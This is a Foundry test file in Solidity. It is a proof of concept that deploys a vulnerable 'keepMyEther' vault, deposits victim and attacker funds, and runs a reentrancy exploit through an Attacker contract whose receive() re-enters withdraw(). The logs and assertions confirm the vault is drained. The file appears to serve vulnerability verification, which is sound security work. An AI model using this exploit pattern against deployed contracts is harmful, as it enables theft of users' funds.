// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol";

contract KeepMyEther_Reentrancy_Test is Test {
    keepMyEther public vault;
    Attacker public attacker;
    
    function setUp() public {
        // Deploy vulnerable vault contract
        vault = new keepMyEther();
        
        // Deploy attacker contract
        attacker = new Attacker(vault);
        
        // Fund attacker contract with initial ETH for deposit
        vm.deal(address(attacker), 1 ether);
    }

    function test_reentrancyAttack() public {
        // Simulate other user deposit (victim) - 1 ether
        // Must use a new address for victim to avoid confusion
        address victim = address(0x1234);
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        (bool victimSuccess,) = address(vault).call{value: 1 ether}("");
        require(victimSuccess, "Victim deposit failed");

        // Attacker deposits 1 ether using its own contract balance
        vm.prank(address(attacker));
        attacker.deposit();

        // Verify vault has 2 ether total (victim + attacker)
        assertEq(address(vault).balance, 2 ether, "Initial vault balance");

        // --- BEFORE-Trigger Attack ---
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerVaultBalanceBefore = vault.balances(address(attacker));
        uint256 totalWithdrawalsBefore = vault.totalWithdrawals();
        
        console.log("Attacker ETH balance: %d", attackerBalanceBefore);
        console.log("Vault ETH balance: %d", vaultBalanceBefore);
        console.log("Attacker vault deposit balance: %d", attackerVaultBalanceBefore);
        console.log("Total withdrawals: %d", totalWithdrawalsBefore);

        // --- Trigger Attack ---
        console.log("--- Trigger Attack ---");
        attacker.attack();

        // --- AFTER-Trigger Attack ---
        console.log("--- AFTER-Trigger Attack ---");
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerVaultBalanceAfter = vault.balances(address(attacker));
        uint256 totalWithdrawalsAfter = vault.totalWithdrawals();
        
        console.log("Attacker ETH balance: %d", attackerBalanceAfter);
        console.log("Vault ETH balance: %d", vaultBalanceAfter);
        console.log("Attacker vault deposit balance: %d", attackerVaultBalanceAfter);
        console.log("Total withdrawals: %d", totalWithdrawalsAfter);
        
        // Calculate balance changes
        uint256 attackerBalanceChange = attackerBalanceAfter - attackerBalanceBefore;
        uint256 vaultBalanceChange = vaultBalanceBefore - vaultBalanceAfter;
        
        console.log("Attacker ETH change: +%d (expected +2 ether)", attackerBalanceChange);
        console.log("Vault ETH change: -%d (expected -2 ether)", vaultBalanceChange);

        // Verify final state confirms exploitation
        if (attackerBalanceChange == 2 ether && vaultBalanceChange == 2 ether) {
            console.log("Vulnerability Exists: Reentrancy attack successfully transferred 2 ETH from vault to attacker");
        } else {
            console.log("Vulnerability not Exist: Attack did not cause expected ETH balance changes");
        }

        // Original assertions to confirm test passing
        assertEq(address(attacker).balance, 2 ether, "Attacker should have double funds");
        assertEq(address(vault).balance, 0, "Vault should be emptied");
    }
}

contract Attacker {
    keepMyEther public vulnerableVault;
    bool private attacking;

    constructor(keepMyEther _vault) {
        vulnerableVault = _vault;
    }

    function deposit() public {
        // Deposit vault using attacker's own ETH balance
        (bool success,) = address(vulnerableVault).call{value: 1 ether}("");
        require(success, "Attacker deposit failed");
    }

    function attack() public {
        attacking = true;
        vulnerableVault.withdraw();
        // Reset flag after withdrawal
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // Only attack once to avoid recursion
            attacking = false;
            vulnerableVault.withdraw();
        }
    }
}